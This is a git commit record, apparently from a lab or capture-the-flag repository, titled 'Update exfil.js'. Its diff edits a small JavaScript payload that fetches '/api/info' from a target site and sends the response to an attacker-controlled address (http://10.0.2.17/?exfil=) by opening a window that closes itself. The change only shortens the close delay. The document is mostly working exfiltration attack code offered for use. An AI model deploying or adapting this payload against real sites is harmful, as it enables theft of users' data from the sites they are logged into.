8d447d0cee40c2ca8dcd4000e3a75d7b1350d666
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 20:04:36 +0200

    Update exfil.js

--- coder.js
+++ coder.js
@@ -2,7 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = () =>{
         if(xhr.readyState == XMLHttpRequest.DONE){
                 openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
-                setTimeout(()=>openwindow.close(),1000)
+                setTimeout(()=>openwindow.close(),500)
         }
 };
 xhr.open('GET',"https://guitjapeo.thl/api/info",false);
